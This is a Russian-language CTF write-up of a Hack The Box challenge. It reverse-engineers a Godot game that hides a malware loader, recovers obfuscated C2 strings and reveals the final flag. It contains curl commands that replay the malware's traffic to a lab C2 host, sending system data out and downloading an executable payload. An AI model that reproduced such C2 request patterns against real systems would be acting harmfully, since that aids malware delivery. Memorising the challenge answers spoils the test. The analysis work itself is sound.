## Ход работы

### 1. Первичная разведка

Запустил игру под Process Monitor, чтобы отследить файловые и процессные действия. С Godot ранее дела не имел, поэтому дальнейший план строил с помощью ИИ-ассистента — тот подсказал GDRE Tools как инструмент для декомпиляции `.pck`-архива Godot-игры.

Попытка декомпилировать `.pck` через GDRE Tools не дала результата — содержимое оказалось зашифровано.

### 2. Восстановление псевдокода в IDA

Открыл бинарник в IDA Pro. Одна из функций не давала сгенерировать псевдокод из-за некорректно определённой сигнатуры (IDA не смогла нормально распознать типы параметров). Через `Edit function prototype` вручную скорректировал типы аргументов (скопировал их по аналогии с сигнатурой соседней/вышестоящей функции) — после этого IDA сгенерировала псевдокод.

В псевдокоде нашёлся цикл, формирующий массив байт — судя по всему, часть логики построения зашифрованных строк (домен, путь, ключ). Байты извлёк и прогнал через деобфускацию.

**Результат оказался бесполезным**: разработчик умышленно сломал структуру `.pck`-файлов так, что даже после фикса сигнатуры и извлечения этого цикла восстановленный кусок кода был неполным — отсутствовала часть переменных, из которых собирались путь к файлу, ключ, cookie и домен. Смотреть статически дальше смысла не было.

### 3. Снятие дампа процесса

Переключился на динамический подход — снятие дампа памяти запущенного процесса игры через System Informer.

- **1-й дамп**: снят преждевременно, оказался неполным — не хватало кода, отвечающего за отправку/получение файла с сервера.
- **2-й дамп**: снят позже, после того как игра прошла нужные стадии выполнения — оказался цельным и содержал полную логику работы с сетью (формирование запросов, декодирование доменов/путей/куки).

Именно из второго дампа был восстановлен полный код (см. `python_script.py` — фрагмент GDScript, отвечающий за отправку данных о системе и получение файла с сервера).

### 4. Деобфускация строковых значений

Схема обфускации в коде простая: значения (домен, путь, ключ для куки, часть флага) собираются как массивы чисел (`int`/`hex`/`bin` вперемешку), которые конкатенируются в нужном порядке через `append_array`, дальше через `Marshalls.base64_to_utf8` декодируются как base64. Установить исходные значения — вопрос последовательно проследить, какие массивы (`jkoq`, `ioqw`, `loap`, `aklq`, `paic` и т.д.) в какие итоговые переменные попадают, и прогнать их через тот же base64-декод. Для ускорения этого шага использовал ИИ.

Извлечённые значения:

| Переменная | Назначение | Значение |
|---|---|---|
| `jkoq` | Домен C2 | `g4m3l0ad3r-network.htb` |
| `ioqw` | Путь к файлу | `p47l0ad_binary` |
| `loap` | 2-я часть флага (MD5 от base64-декода) | `GD_M@lw4r3_PCB29543}` |
| `aklq + paic` | Значение Cookie | байтовая последовательность (см. ниже) |

Домен дополнительно подтверждён перехватом трафика в Wireshark — запросы игры реально уходили на `g4m3l0ad3r-network.htb`.

### 5. Воспроизведение запросов к серверу

Игра сама по себе слала данные на сервер при переключении режимов — эти же запросы был воспроизведены вручную через `curl` с HTB Pwnbox (задача требовала подключения к серверу изнутри инфраструктуры HTB).

**Шаг 1 — регистрация клиента (`POST /enum`):**

```
curl -i -X POST http://154.57.164.81:32625/enum \
  -H "Host: g4m3l0ad3r-network.htb" \
  -H "User-Agent: GodotEngine" \
  -H "Content-Type: application/json" \
  -d '{"os_name":"Windows","processor_name":"AMD Ryzen 7 7700 8-Core Processor","cpu_cores":8,"is_64bit":false,"locale":"ru_RU","user_dir":"C:/Users/kosty/AppData/Roaming/Godot/app_userdata/2DPlatformer"}'
```

Ответ: `HTTP/1.1 200`

**Шаг 2 — получение файла (`GET /{path}`), с cookie, восстановленной из `aklq`+`paic`:**

```
curl -i -X GET http://154.57.164.81:32625/p47l0ad_binary \
  -H "Host: g4m3l0ad3r-network.htb" \
  -H "User-Agent: GodotEngine" \
  -H "Cookie: 57151533199105491179012282116775011911989878112290122821167750119119"
```

Ответ: `HTTP/1.1 200`, файл `new_level_mod.exe` (23566 байт) плюс заголовок:

```
Server: Werkzeug/3.1.6 Python/3.12.13
Content-Disposition: attachment; filename=new_level_mod.exe
Content-Type: application/octet-stream
Content-Length: 23566
Last-Modified: Fri, 13 Mar 2026 18:22:44 GMT
ETag: "1773426164.0-23566-1761151181"
X-Half-Flag: HTB{Und3t3ct3d_
Connection: close
```

Первая половина флага пришла прямо в заголовке ответа (`X-Half-Flag`) — этот момент обнаружился уже постфактум, при повторном просмотре ответа сервера.

### 6. Сборка флага

Первая часть — из заголовка `X-Half-Flag`, вторая — из декодированной переменной `loap`:

```
HTB{Und3t3ct3d_  +  GD_M@lw4r3_PCB29543}
```

**Итоговый флаг:** `HTB{Und3t3ct3d_GD_M@lw4r3_PCB29543}`

## Ограничения / что не входило в разбор

Задача решалась как crackme на получение ключа/флага, а не как полноценный анализ вредоносного ПО. Скачанный `new_level_mod.exe` статически/динамически как малварь не анализировался — задача считается закрытой на этапе получения флага. Файл был получен только на стороне HTB Pwnbox; для полноценного анализа его потребовалось бы дополнительно перенести на локальную машину.

## Заключение

Задача — reverse engineering игры на Godot Engine с обфусцированной сетевой логикой. Ключевые этапы: восстановление корректного псевдокода в IDA через ручную правку сигнатуры функции, переход от статического анализа `.pck` (заблокированного разработчиком намеренно) к динамическому снятию дампа процесса, деобфускация значений через прослеживание сборки байтовых массивов и base64-декод, и ручное воспроизведение HTTP-обмена клиент-сервер для получения обеих частей флага.

**Инструменты ИИ** (Gemini, Claude) использовались как вспомогательные — для консультаций по незнакомому стеку (Godot) и ускорения рутинной деобфускации; поиск в дампах, восстановление сигнатуры функции и извлечение флагов выполнялись самостоятельно.
